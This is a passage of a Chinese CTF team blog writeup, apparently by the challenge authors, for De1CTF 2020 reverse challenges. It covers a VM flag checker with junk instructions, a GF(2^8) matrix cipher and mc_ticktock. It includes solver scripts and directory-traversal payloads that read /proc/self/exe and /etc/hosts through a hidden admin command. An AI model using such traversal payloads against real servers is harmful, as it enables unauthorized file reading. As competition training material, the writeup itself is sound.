class="comment">//&#123;</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x22</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x23</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x24</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x26</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x27</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x28</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x29</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2b</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2c</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2d</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2e</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2f</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x31</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x32</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x33</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x34</span>,<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>检测flag的格式</li>
</ol>
<p>下面这几个检测分布在虚拟机指令的各个角落</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x2a</span>,<span class="number">0x19</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'d'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1a</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'e'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'1'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1c</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'c'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'t'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1e</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'f'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1f</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'&#123;'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'&#125;'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br></pre></td></tr></table></figure>
<p>花指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">_asm</span><br><span class="line">   &#123;</span><br><span class="line">       mov eax, _PE1</span><br><span class="line">       push eax</span><br><span class="line">       push fs : [0]</span><br><span class="line">       mov fs : [0] , esp</span><br><span class="line">       xor ecx, ecx</span><br><span class="line">       div ecx</span><br><span class="line">       retn</span><br><span class="line">       _PE1 :</span><br><span class="line">       mov esp, [esp + 8]</span><br><span class="line">           mov eax, fs : [0]</span><br><span class="line">           mov eax, [eax]</span><br><span class="line">           mov eax, [eax]</span><br><span class="line">           mov fs : [0] , eax</span><br><span class="line">           add esp, 8</span><br><span class="line">   &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    _asm</span><br><span class="line">   &#123;</span><br><span class="line">       jz _P2</span><br><span class="line">       jnz _P2</span><br><span class="line">       _P1 :</span><br><span class="line">       __emit 0xE8</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">     _asm</span><br><span class="line">   &#123;</span><br><span class="line">       call _P1</span><br><span class="line">       _P1 :</span><br><span class="line">       add[esp], 5</span><br><span class="line">           retn</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">       _asm</span><br><span class="line">           &#123;</span><br><span class="line">               xor eax, eax</span><br><span class="line">               add eax, 2</span><br><span class="line">               ret 0xff</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
<p>3.将flag包装内的20个字符分成10组，分组进行base58编码</p>
<p>机器码太长了，这里就放个伪码</p>
<p>需要注意的是，虽然用的table是64位长,但是使用的算法是base58而不是base64</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">table = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;<span class="number">10</span>;++i)&#123;</span><br><span class="line">  reg = (memSpace[<span class="number">0x20</span>+i*<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)+memspace(<span class="number">0x21</span>+i*<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">3</span>;j&gt;<span class="number">0</span>;--j)&#123;</span><br><span class="line">    memspace[<span class="number">0x39</span>+j+i*<span class="number">3</span>] = table[reg%<span class="number">58</span>];</span><br><span class="line">    reg /= <span class="number">58</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.分组加密</p>
<p>然后不知道咋的，突发奇想吧，搞了轮加密，分组进行的。</p>
<p>模加，模减，异或这三种运算都是可逆的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(int i = <span class="number">0</span>,i&lt;<span class="number">30</span>,i+=<span class="number">3</span>)&#123;</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>]+memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>];</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>]-memSpace[<span class="number">0x40</span>+i+<span class="number">1</span>];</span><br><span class="line">  memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>] = memSpace[<span class="number">0x40</span>+i+<span class="number">0</span>]^memSpace[<span class="number">0x40</span>+i+<span class="number">2</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>5.对加密后的结果进行检测</p>
<p>不放机器码的理由同上。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0x7a</span>,<span class="number">0x19</span>,<span class="number">0x4f</span>,<span class="number">0x6e</span>,<span class="number">0xe</span>,<span class="number">0x56</span>,<span class="number">0xaf</span>,<span class="number">0x1f</span>,<span class="number">0x98</span>,<span class="number">0x58</span>,<span class="number">0xe</span>,<span class="number">0x60</span>,<span class="number">0xbd</span>,<span class="number">0x42</span>,<span class="number">0x8a</span>,<span class="number">0xa2</span>,<span class="number">0x20</span>,<span class="number">0x97</span>,<span class="number">0xb0</span>,<span class="number">0x3d</span>,<span class="number">0x87</span>,<span class="number">0xa0</span>,<span class="number">0x22</span>,<span class="number">0x95</span>,<span class="number">0x79</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0xc</span>,<span class="number">0x6d</span>]</span><br><span class="line"><span class="keyword">for</span> i in range(len(enc_flag)):</span><br><span class="line">    <span class="keyword">if</span> enc_flag[i]!=memSpace[i]:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>6.虚拟机运行完毕，返回true</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0xab</span>:<span class="keyword">return</span> <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<h3><span id="exppy">exp.py</span></h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0x7a</span>,<span class="number">0x19</span>,<span class="number">0x4f</span>,<span class="number">0x6e</span>,<span class="number">0xe</span>,<span class="number">0x56</span>,<span class="number">0xaf</span>,<span class="number">0x1f</span>,<span class="number">0x98</span>,<span class="number">0x58</span>,<span class="number">0xe</span>,<span class="number">0x60</span>,<span class="number">0xbd</span>,<span class="number">0x42</span>,<span class="number">0x8a</span>,<span class="number">0xa2</span>,<span class="number">0x20</span>,<span class="number">0x97</span>,<span class="number">0xb0</span>,<span class="number">0x3d</span>,<span class="number">0x87</span>,<span class="number">0xa0</span>,<span class="number">0x22</span>,<span class="number">0x95</span>,<span class="number">0x79</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0xc</span>,<span class="number">0x6d</span>]</span><br><span class="line">table = <span class="string">'0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/='</span></span><br><span class="line">enc = [<span class="keyword">None</span>]*<span class="number">30</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(i!=<span class="number">30</span>):</span><br><span class="line">  enc_flag[i+<span class="number">0</span>] = enc_flag[i+<span class="number">2</span>]^enc_flag[i+<span class="number">0</span>]</span><br><span class="line">  enc_flag[i+<span class="number">2</span>] = (enc_flag[i+<span class="number">2</span>]-enc_flag[i+<span class="number">1</span>]+<span class="number">0x100</span>)%<span class="number">0x100</span></span><br><span class="line">  enc_flag[i+<span class="number">1</span>] = (enc_flag[i]+enc_flag[i+<span class="number">1</span>]+<span class="number">0x100</span>)%<span class="number">0x100</span></span><br><span class="line">  i+=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc_flag)):</span><br><span class="line">  temp += chr(enc_flag[i])</span><br><span class="line">enc_flag = temp</span><br><span class="line">print(enc_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc_flag)):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(len(table)):</span><br><span class="line">    <span class="keyword">if</span> ord(enc_flag[i])==ord(table[j]):</span><br><span class="line">      enc[i] = j</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"de1ctf&#123;"</span>,end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">  temp = enc[i*<span class="number">3</span>]*<span class="number">58</span>*<span class="number">58</span>+enc[i*<span class="number">3</span>+<span class="number">1</span>]*<span class="number">58</span>+enc[i*<span class="number">3</span>+<span class="number">2</span>]</span><br><span class="line">  print(<span class="string">"&#123;&#125;&#123;&#125;"</span>.format(chr(temp//<span class="number">256</span>),chr(temp%<span class="number">256</span>)),end = <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&#125;"</span>,end = <span class="string">''</span>)</span><br></pre></td></tr></table></figure>
<h2><span id="little-elves">little elves</span></h2>
<p>参考一个很小的elf头tiny elf，直接能执行汇编代码，通过系统调用获取输入，校验完后调用exit，正确会返回0，错误返回1。</p>
<p>加入了一些简单的花指令，基本上匹配对应模式就可以去除。</p>
<p>需要注意的是，elf头中定义的程序头的偏移是在4的位置，从第四个字节开始程序头和ELF头进行了复用。程序头的第三个成员代表段的其实地址，可以看到是00888000，所以加载的时候要自定义偏移0x888000，后续一些地址才是正确的。</p>
<p>算法方面，是有限域GF(2<sup>8)上的矩阵乘法（就像希尔密码），用到的多项式是x</sup>9+x<sup>5+x</sup>4+x<sup>3+1，（<code>Rijndael MixColumns</code>中用的是x</sup>9+x<sup>4+x</sup>3+x+1），需要一点点数学功底，或者求助密码学队友。</p>
<p>使用sage计算矩阵的逆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.all <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">"De1CTF&#123;01ab211f-589b-40b7-9ee4-4243f541fc40&#125;"</span></span><br><span class="line">SIZE = len(flag)</span><br><span class="line">res = [<span class="number">200</span>, <span class="number">201</span>, <span class="number">204</span>, <span class="number">116</span>, <span class="number">124</span>, <span class="number">94</span>, <span class="number">129</span>, <span class="number">127</span>, <span class="number">211</span>, <span class="number">85</span>, <span class="number">61</span>, <span class="number">154</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">19</span>, <span class="number">134</span>, <span class="number">121</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">219</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">93</span>, <span class="number">252</span>, <span class="number">152</span>, <span class="number">87</span>, <span class="number">32</span>, <span class="number">171</span>, <span class="number">228</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">98</span>, <span class="number">203</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">63</span>, <span class="number">215</span>, <span class="number">186</span>, <span class="number">201</span>, <span class="number">128</span>, <span class="number">103</span>, <span class="number">52</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">i2x</span><span class="params">(num)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num!=<span class="number">0</span>:</span><br><span class="line">        res += (num&amp;<span class="number">1</span>) * (x^i)</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">i2y</span><span class="params">(num)</span>:</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> num!=<span class="number">0</span>:</span><br><span class="line">        res += (num&amp;<span class="number">1</span>) * (y^i)</span><br><span class="line">        num &gt;&gt;= <span class="number">1</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">y2i</span><span class="params">(r)</span>:</span></span><br><span class="line">    tmp = r.list()</span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp[::<span class="number">-1</span>]:</span><br><span class="line">        res &lt;&lt;= <span class="number">1</span></span><br><span class="line">        res += int(i)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vi2y</span><span class="params">(v)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        res.append(i2y(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vy2i</span><span class="params">(v)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        res.append(y2i(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mi2y</span><span class="params">(m)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(vi2y(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my2i</span><span class="params">(m)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(vy2i(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(<span class="number">2</span>), <span class="string">'x'</span>)</span><br><span class="line">S.&lt;y&gt; = QuotientRing(R, R.ideal(i2x(<span class="number">313</span>)))</span><br><span class="line"></span><br><span class="line">M = MatrixSpace(S, SIZE, SIZE)</span><br><span class="line">V = VectorSpace(S, SIZE)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">genM</span><span class="params">()</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(SIZE):</span><br><span class="line">        tmp = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(SIZE):</span><br><span class="line">            tmp.append(random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">        res.append(tmp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">A = <span class="comment"># matrix here ...</span></span><br><span class="line"><span class="comment">#A = genM()</span></span><br><span class="line">AM = M(mi2y(A))</span><br><span class="line">v = V(vi2y(res))</span><br><span class="line">f = vy2i(AM.solve_right(v))</span><br><span class="line">f = <span class="string">""</span>.join(map(chr, f))</span><br><span class="line">print(f)</span><br></pre></td></tr></table></figure>
<h2><span id="mc_ticktock">mc_ticktock</span></h2>
<p>文件列表： <a href="https://pastebin.com/YtCdrzCd" target="_blank" rel="noopener">exp.go</a> <a href="https://pastebin.com/rWAPYaRp" target="_blank" rel="noopener">types.go</a> <a href="https://pastebin.com/CYtng7mR" target="_blank" rel="noopener">crypt.go</a></p>
<p>上一题提到的 <code>/MC2020-DEBUG-VIEW:-)</code> 隐藏命令，是管理员用于读取指定 <code>uuid</code> 玩家 <code>log日志文件</code> 的命令。</p>
<p>很容易联想到 <code>目录穿越</code> 去实现 <code>任意文件读取</code>。</p>
<p>接下来我们可以读取以及逆向 <code>../../../../../../../proc/self/exe</code> (<code>go run exp.go types.go crypt.go -s1</code>)</p>
<p>文件含有符号表。</p>
<p>在 <code>main_main</code> 函数开头可以找到以下代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_, err := os.Stat(&quot;webserver&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">    log.Fatal(&quot;webserver not found&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们继续读 <code>../../../../../../../proc/self/cwd/webserver</code> (<code>go run exp.go types.go crypt.go -s2</code>)</p>
<p>文件没有符号表，可以使用 <a href="https://github.com/sibears/IDAGolangHelper" target="_blank" rel="noopener">IDAGolangHelper</a> 进行恢复。</p>
<p>文件有以下三个功能。</p>
<ol type="1">
<li><code>http://:80/ticktock?text={text}</code></li>
</ol>
<p>这里会有一个修改过的 SM4 加密算法，会对 {text} 进行加密，然后返回密文，同时与预设密文进行比较。比较相同，会将你的ip记录下来，然后你才能使用功能二和功能三，此时明文就是本题的flag值。</p>
<p>记录ip的表每20分钟（20分钟是mc里一昼夜的时间）清空一次。</p>
<p>加密过程大致如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KEY := Sha256([]byte(&quot;de1ctf-mc2020&quot;))</span><br><span class="line">NONCE := Sha256([]byte(&quot;de1ta-team&quot;))[:24]</span><br><span class="line">c, _ := crypt.NewCipher(KEY[:16])</span><br><span class="line">s := cipher.NewCFBEncrypter(c, NONCE[:16])</span><br><span class="line">plain := []byte(&quot;example plain text&quot;)</span><br><span class="line">buff := make([]byte, len(plain))</span><br><span class="line">s.XORKeyStream(buff, plain)</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li><code>http://:80/webproxy</code></li>
</ol>
<p>由于平时在开发网络协议，所以出题时也写了个代理，作为考点，想让选手访问内部网络的题。然后没想到有点难度，最后比赛过程中，这部分被临时砍掉了，出题人翻车了。</p>
<p>使用这个代理功能，可以实现 <code>http代理</code> 和 <code>端口扫描</code> 的功能。</p>
<p>剩下三道题 <code>mc_realworld</code> &amp; <code>mc_logclient</code> &amp; <code>mc_noisemap</code> 都需要使用这个代理去访问。</p>
<p>三道题的ip，可以使用 <code>/MC2020-DEBUG-VIEW:-) ../../../../../etc/hosts</code> 读取 <code>/etc/hosts</code> 来获取。</p>
<p>如何使用呢？发 POST 请求，POST 请求 BODY 使用 <code>chacha20</code> 加密。加密过程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KEY := Sha256([]byte(&quot;de1ctf-mc2020&quot;))</span><br><span class="line">NONCE := Sha256([]byte(&quot;de1ta-team&quot;))[:24]</span><br><span class="line">cipher, _ := chacha20.NewUnauthenticatedCipher(KEY[:], NONCE[:])</span><br><span class="line">body := []byte(&quot;127.0.0.1:80|GET /assets/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n&quot;)</span><br><span class="line">buff := make([]byte, len(body))</span><br><span class="line">cipher.XORKeyStream(buff, body)</span><br></pre></td></tr></table></figure>
<ol start="3" type="1">
<li><code>tcp://:8080/</code></li>
</ol>
<p>一个自定义TCP代理，用于 <code>mc_realworld</code> 的游戏服务。双向流量使用上面提到的 <code>chacha20</code> 加密。</p>
<p>使用命令 <code>go run exp.go types.go crypt.go -s3</code>，可以得到 flag。</p>
<p><code>De1CTF{t1Ck-t0ck_Tlck-1ocK_MC2O20_:)SM4}</code></p>

    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/ctf/">#ctf</a> <a href="/tags/re/">#re</a> <a href="/tags/web/">#web</a> <a href="/tags/crypto/">#crypto</a> <a href="/tags/pwn/">#pwn</a> <a href="/tags/misc/">#misc</a> <a href="/tags/writeup/">#writeup</a> <a href="/tags/xctf/">#xctf</a>
        </div>
    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    De1ta-Team: De1iver the tea
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2099/05/22/Write-ups-for-CTFs/">Write ups for CTFs</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2020/05/06/de1ctf2020 Writeup/">XCTF De1CTF 2020 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2020/03/10/XCTF<ZHANYI>-2020/">XCTF战疫 2020 Writeup</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/08/19/SUCTF2019/">SUCTF 2019 Writeup</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/De1ta-team">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="/atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @De1ta-Team. All right reserved
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
